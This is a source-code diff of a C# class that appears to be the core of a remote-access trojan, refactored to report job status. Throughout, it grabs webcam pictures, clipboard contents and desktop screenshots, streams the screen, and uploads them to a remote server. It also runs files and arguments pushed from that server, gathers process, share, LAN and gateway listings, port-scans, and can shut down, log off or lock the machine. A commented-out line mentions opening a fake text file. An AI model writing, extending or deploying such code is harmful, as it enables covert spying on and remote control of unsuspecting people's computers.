@@ -15,24 +15,6 @@ using System.Windows.Forms;
 
 namespace Library
 {
-    public class AuthEventArgs : EventArgs
-    {
-        public bool IsAuthenticated { get; set; }
-        public AuthEventArgs()
-        {
-
-        }
-    }
-    public class CommandEventArgs : EventArgs
-    {
-        public ECommand Command { get; set; }
-
-        public CommandEventArgs()
-        {
-
-        }
-    }
-
     public delegate void OnFileEventDelegate(object sender, FileSystemEventArgs e);
     public delegate void OnCommandDelegate(object sender, CommandEventArgs e);
     public delegate void OnAuthorizedHandler(object sender, AuthEventArgs e);
@@ -40,11 +22,9 @@ namespace Library
     public class Handler
     {
         public TransmitterStatus TransmitterStatus { get; set; }
-        //public bool IsBusy { get; set; }
         private bool isQuitting = false;
         private FileSystemWatcher watcher;
         public Transmitter Transmitter { get; set; }
-        public Bitmap Screenshot { get; private set; }
         public FileDirHandler FileDirInfo { get; private set; }
         public event OnFileEventDelegate OnFileEvent;
         public event OnCommandDelegate OnCommandEvent;
@@ -130,16 +110,12 @@ namespace Library
                 NotifyFilters.Security |
                 NotifyFilters.Size;
             watcher.IncludeSubdirectories = includeSubdirectories;
-
             watcher.Changed += watcher_Changed;
             watcher.Created += watcher_Created;
             watcher.Deleted += watcher_Deleted;
             watcher.Renamed += watcher_Renamed;
-
             watcher.EnableRaisingEvents = true;
-
             //Console.WriteLine("Watching dir: " + directory);
-            //MessageBox.Show("Watching dir: " + directory);
         }
 
         public void StopDirectoryWatcher()
@@ -282,7 +258,8 @@ namespace Library
             long quality = 95;
             long.TryParse(Handler.Instance.Transmitter.TSettings.Parameters, out quality);
             var bitmapImage = GetWebCamImage();
-            Handler.Instance.Transmitter.UploadImage("webcam.jpg", bitmapImage, quality);
+            StartWork(true);
+            Transmitter.UploadImage("webcam.jpg", bitmapImage, quality);
         }
 
         private Bitmap GetWebCamImage(int id = 0)
@@ -318,48 +295,46 @@ namespace Library
                 Transmitter.UploadData("clipboard.txt", clipboardText, false);
             }
             // Upload clipboard image
-            var clipboardImage = Clipboard.GetImage();
-            if (clipboardImage != null)
-            {
-                Transmitter.UploadImage("clipboard.jpg", clipboardImage, quality);
-            }
+            StartWork(true);
+            Transmitter.UploadImage("clipboard.jpg", Clipboard.GetImage(), quality);
         }
 
-        public UploadResult UploadDesktopImage()
+        public void UploadDesktopImage()
         {
-            UploadResult result = null;
             long quality = 80;
             long.TryParse(Transmitter.TSettings.Parameters, out quality);
             var bitmapImage = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
-            if (bitmapImage != null)
-            {
-                result = new UploadResult()
-                {
-                    FileName = "desktop.jpg",
-                    FileSize = bitmapImage.ImageToByte().Length
-                };
-                Transmitter.UploadImage("desktop.jpg", bitmapImage, quality);
-            }
-            return result;
+            //if (bitmapImage != null)
+            //{
+            //    result = new UploadResult()
+            //    {
+            //        FileName = "desktop.jpg",
+            //        FileSize = bitmapImage.ImageToByte().Length
+            //    };
+            //    Transmitter.UploadImage("desktop.jpg", bitmapImage, quality);
+            //}
+            StartWork(true);
+            Transmitter.UploadImage("desktop.jpg", bitmapImage, quality);
         }
 
         public void ExecuteCommand()
         {
-
+            StartWork(true, false);
             var fileName = Transmitter.TSettings.File;
             var fileArgs = Transmitter.TSettings.Parameters;
-
+            //MessageBox.Show(fileName + "\n" + fileArgs);
             fileArgs = fileArgs != null ? fileArgs : "";
             try
             {
                 if (!string.IsNullOrEmpty(fileName))
                 {
+                    Process p = null;
                     var hasExecuted = false;
                     try
                     {
                         ProcessStartInfo psi = new ProcessStartInfo(fileName, fileArgs);
                         psi.WorkingDirectory = AppDir;
-                        Process.Start(psi);
+                        p = Process.Start(psi);
                         hasExecuted = true;
                     }
                     catch (Exception ex)
@@ -373,9 +348,13 @@ namespace Library
                         {
                             ProcessStartInfo psi = new ProcessStartInfo(fileName, fileArgs);
                             psi.WorkingDirectory = DirTransfers;
-                            Process.Start(psi);
+                            p = Process.Start(psi);
                         }
                         catch (Exception ex2) { }
+                    }
+                    if (p != null)
+                    {
+                        Debug.WriteLine(p.StandardOutput.ReadToEnd());
                     }
                 }
             }
@@ -392,8 +371,6 @@ namespace Library
         public bool StartNewProcessOnExit { get; set; }
         private int CONNECTION_TIMEOUT = 10000;
         private int CONNECTION_INTERVAL = 10000;
-
-
         private Timer transmitTimer;
         private int transmitTimerInterval = 5000;
         private Timer connectTimer;
@@ -438,7 +415,6 @@ namespace Library
             CreateDirectory(DirPlugins);
             //OpenFakeTextFile("Hey!");
             Transmitter = new Library.Transmitter(option.Url, option.APIKEY_PRIVATE, option.APIKEY_PUBLIC, CONNECTION_TIMEOUT);
-
             //foo = Handler.Instance.Transmitter.Test(2);
             //foo = Handler.Instance.Transmitter.Test2("bar");
             //var compHash = Handler.Instance.Transmitter.GetComputerHash();
@@ -493,6 +469,7 @@ namespace Library
 
         public void SetTransmissionInterval()
         {
+            StartWork(true, false);
             var timeMS = Transmitter.TSettings.Parameters;
             int newInterval = 5000;
             if (int.TryParse(timeMS, out newInterval))
@@ -614,59 +591,50 @@ namespace Library
 
         public JobWorker Worker { get; set; }
 
-        public void StartWork(bool isDone = false, string fileName = "", int fileSize = -1)
+        public void ReportWork()
+        {
+
+        }
+
+        public void StartWork(bool isDone = false, bool canUploadResult = true)
         {
             if (Worker != null)
             {
                 TransmitterStatus = TransmitterStatus.BUSY;
-                Worker.Start(fileName, fileSize);
-                UploadResult(Worker.Result);
+                Worker.Start();
                 if (isDone)
                 {
-                    Worker.IsDone = true;
-                    Worker.Result.Percentage = 100;
+                    Worker.Stop();
+                }
+                if (canUploadResult)
+                {
+                    UploadResult(Worker.Result);
                 }
             }
         }
 
-        public void StopWork()
+        public void StopWork(bool canUploadResult = true)
         {
             if (Worker != null)
             {
                 TransmitterStatus = TransmitterStatus.IDLE;
-                UploadResult(Worker.Result);
+                if (canUploadResult)
+                {
+                    UploadResult(Worker.Result);
+                }
                 Worker.Stop();
                 Transmitter.SetHasExectuted(Handler.Instance.Transmitter.TSettings);
             }
         }
 
-        int temp = 0;
-
         public void UploadPortInfo()
         {
             StringBuilder sb = new StringBuilder();
             var piList = FirewallManager.Instance.GetPortInfo();
-            piList.ForEach((Library.PortInfo pi) => sb.AppendLine(pi.IP + ":" + pi.Port + " - " + pi.Name));
+            piList.ForEach((PortInfo pi) => sb.AppendLine(pi.IP + ":" + pi.Port + " - " + pi.Name));
             var data = sb.ToString();
-            StartWork(false, "ports.txt", data.Length);
-
-            var t = new System.Windows.Forms.Timer();
-            t.Interval = 1000;
-            t.Tick += (o, e) =>
-            {
-                temp++;
-                if (temp > 3)
-                {
-                    Worker.IsDone = true;
-                }
-                else
-                {
-                    Worker.Result.Percentage += 25;
-                    Handler.Instance.UploadResult(Worker.Result);
-                }
-            };
-            t.Start();
-            Handler.Instance.Transmitter.UploadData(Worker.Result.FileName, data, false);
+            StartWork(true);
+            Transmitter.UploadData("ports.txt", data, false);
         }
 
         public void UploadProcessInfo()
@@ -676,30 +644,53 @@ namespace Library
             {
                 sb.AppendLine("Name: " + p.Name + ", PID: " + p.PID);
             }
-            Handler.Instance.Transmitter.UploadData("processes.txt", sb.ToString(), false);
+            StartWork(true);
+            Transmitter.UploadData("processes.txt", sb.ToString(), false);
         }
 
         public void StopStreamDesktop()
         {
-            if (streamDesktopTimer == null) return;
-            streamDesktopTimer.Enabled = false;
-            streamDesktopTimer.Stop();
+            StopWork(false);
+            if (streamDesktopTimer != null)
+            {
+                streamDesktopTimer.Enabled = false;
+                streamDesktopTimer.Stop();
+            }
         }
 
         public void StreamDesktop()
         {
-            var interval = 10000;
-            if (!int.TryParse(Handler.Instance.Transmitter.TSettings.Parameters, out interval))
+            StartWork(false);
+            var interval = 5000;
+            var quality = 10L;
+            if (!string.IsNullOrEmpty(Transmitter.TSettings.Parameters))
             {
-                interval = 10000;
+                var inputSplit = Transmitter.TSettings.Parameters.Split(';');
+                if (inputSplit.Length >= 1)
+                {
+                    var intervalTemp = interval;
+                    if (!int.TryParse(inputSplit[0], out intervalTemp))
+                    {
+                        interval = intervalTemp;
+                    }
+                }
+                interval = interval >= 1000 && interval <= 10000 ? interval : 5000;
+                if (inputSplit.Length >= 2)
+                {
+                    var qualityTemp = quality;
+                    if (!long.TryParse(inputSplit[1], out qualityTemp))
+                    {
+                        quality = qualityTemp;
+                    }
+                }
             }
             streamDesktopTimer = new Timer();
             streamDesktopTimer.Interval = interval;
             streamDesktopTimer.Tick += (o, e) =>
             {
-                var quality = 10L;
                 Bitmap bitmapImage = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
-                Handler.Instance.Transmitter.UploadImage("stream.jpg", bitmapImage, quality);
+                UploadResult(Worker.Result);
+                Transmitter.UploadImage("stream.jpg", bitmapImage, quality);
                 //CursorInteract();
             };
             streamDesktopTimer.Enabled = true;
@@ -950,6 +941,12 @@ namespace Library
 
         public void ExecuteCode()
         {
+            ExecuteCodePvt();
+            StartWork(true, false);
+        }
+
+        void ExecuteCodePvt()
+        {
             string code = @"
     using System;
     using System.Drawing;
@@ -999,141 +996,110 @@ namespace Library
 
         public void UploadResult(UploadResult result)
         {
-            Handler.Instance.Transmitter.UploadData("result.json", Newtonsoft.Json.JsonConvert.SerializeObject(result), false);
+            Transmitter.UploadData("result.json", Newtonsoft.Json.JsonConvert.SerializeObject(result), false);
         }
 
-        public UploadResult UploadShares()
+        public void UploadShares()
         {
             StringBuilder sb = new StringBuilder();
             var piList = FirewallManager.Instance.GetShareInfo();
             piList.ForEach((Library.ShareInfo si) => sb.AppendLine("Name: " + si.Name + ", Remark: " + si.Remark + ", Type: " + si.Type));
             var data = sb.ToString();
-            UploadResult result = new UploadResult()
-            {
-                FileName = "shares.txt",
-                FileSize = data.Length
-            };
-            Handler.Instance.Transmitter.UploadData(result.FileName, data, false);
-            return result;
+            StartWork(true);
+            Transmitter.UploadData("shares.txt", data, false);
         }
 
-        public UploadResult UploadLANComputers()
+        public void UploadLANComputers()
         {
             StringBuilder sb = new StringBuilder();
             var piList = FirewallManager.Instance.GetLANComputers();
             piList.ForEach((Library.LANComputerInfo lci) => sb.AppendLine("Name: " + lci.Name));
             var data = sb.ToString();
-            UploadResult result = new UploadResult()
-            {
-                FileName = "lan_computers.txt",
-                FileSize = data.Length
-            };
-            Handler.Instance.Transmitter.UploadData(result.FileName, data, false);
-            return result;
+            StartWork(true);
+            Transmitter.UploadData("lan_computers.txt", data, false);
         }
 
-        public UploadResult UploadGatewayInfo()
+        public void UploadGatewayInfo()
         {
             StringBuilder sb = new StringBuilder();
             var piList = FirewallManager.Instance.GetGetwayInfo();
             piList.ForEach((Library.GatewayInfo i) => sb.AppendLine("Adapter description: " + i.AdapterDescription + ", Address: " + i.Address));
             var data = sb.ToString();
-            UploadResult result = new UploadResult()
-            {
-                FileName = "gateways.txt",
-                FileSize = data.Length
-            };
-            Handler.Instance.Transmitter.UploadData(result.FileName, data, false);
-            return result;
+            StartWork(true);
+            Transmitter.UploadData("gateways.txt", data, false);
         }
 
-
-
-        public UploadResult UploadPortscan()
+        public void UploadPortscan()
         {
-            sbPorts = new StringBuilder();
-            ps = new PortScanner("127.0.0.1", 80, 1024, 10);
+            StartWork(false);
+            var sbPorts = new StringBuilder();
+            var ps = new PortScanner(Transmitter.TSettings.Parameters);
             var timer = new System.Windows.Forms.Timer();
-            timer.Interval = 1000;
-            timer.Tick += timer_Tick;
-            timer.Enabled = true;
-            var portType = PortType.TCP;
-            sbPorts.AppendLine((portType == PortType.TCP ? "TCP" : "UDP") + " Portscan initiated...");
-            sbPorts.AppendLine("Target: " + ps.ScanAddress + ", Timeout: " + ps.PortTimeoutTreshold + ", Range: " + ps.PortStart + " - " + ps.PortEnd);
-            if (ps.RunScan(PortType.TCP))
+            timer.Interval = 100;
+            timer.Tick += (o, e) =>
             {
-                sbPorts.AppendLine("Portscan finished!");
-                timer.Enabled = false;
-            }
-            //piList.ForEach((Library.GatewayInfo i) => sbPorts.AppendLine("Adapter description: " + i.AdapterDescription + ", Address: " + i.Address));
-            var data = sbPorts.ToString();
-            UploadResult result = new UploadResult()
-            {
-                FileName = "portscan.txt",
-                FileSize = data.Length
-            };
-            Handler.Instance.Transmitter.UploadData(result.FileName, data, false);
-            return result;
-        }
-
-        PortScanner ps;
-        StringBuilder sbPorts;
-
-        void timer_Tick(object sender, EventArgs e)
-        {
-            if (ps != null && ps.IsReady)
-            {
-                while (ps.ScanResults.Count > 0 && ps.PortScanFinished == false)
+                if (ps != null)
                 {
-                    var result = ps.ScanResults.Dequeue();
-                    if (result != null)
+                    while (ps.ScanResults.Count > 0)
                     {
-                        if (result.IsOpen)
+                        var scanResult = ps.ScanResults.Dequeue();
+                        if (scanResult != null)
                         {
-                            sbPorts.AppendLine(result.ToString());
-                        }
-                        else
-                        {
-                            if (ps.CanPrintClosedPorts)
-                            {
-                                sbPorts.AppendLine(result.ToString());
-                            }
+                            // Currently adds all ports (open and closed). Use scanResult.IsOpen to check if you only need open ports.
+                            sbPorts.AppendLine(scanResult.ToString());
                         }
                     }
+                    timer.Enabled = false;
+                    sbPorts.AppendLine("Portscan finished!");
+                    var data = sbPorts.ToString();
+                    Worker.IsDone = true;
+                    UploadResult(Worker.Result);
+                    Transmitter.UploadData("portscan.txt", data, false);
+                    //txtStatus.Text = "Port scan " + Math.Round(ps.PercentageDone, 0) + "%. Found: " + ps.FoundPorts.Count;
                 }
-                //txtStatus.Text = "Port scan " + Math.Round(ps.PercentageDone, 0) + "%. Found: " + ps.FoundPorts.Count;
-            }
+            };
+            timer.Enabled = true;
+            //sbPorts.AppendLine((portInfo.EPortType == EPortType.TCP ? "TCP" : "UDP") + " Portscan initiated...");
+            sbPorts.AppendLine("Portscan initiated...");
+            sbPorts.AppendLine("Target: " + ps.Data.IPAddressString + ", Timeout: " + ps.PortTimeoutTreshold + ", Range: " + ps.Data.PortStart + " - " + ps.Data.PortEnd);
+            ps.Start();
         }
 
         // http://www.computerhope.com/shutdown.htm
         public void Shutdown()
         {
             SystemPowerUtils.Shutdown();
+            StartWork(true, false);
         }
 
         public void Restart()
         {
             SystemPowerUtils.Restart();
+            StartWork(true, false);
         }
 
         public void Logoff()
         {
             SystemPowerUtils.Logoff();
+            StartWork(true, false);
         }
 
         public void LockComputer()
         {
             SystemPowerUtils.LockComputer();
+            StartWork(true, false);
         }
 
         public void Hibernate()
         {
             SystemPowerUtils.Hibernate();
+            StartWork(true, false);
         }
 
         public void Sleep()
         {
             SystemPowerUtils.Sleep();
+            StartWork(true, false);
         }
     }
 }
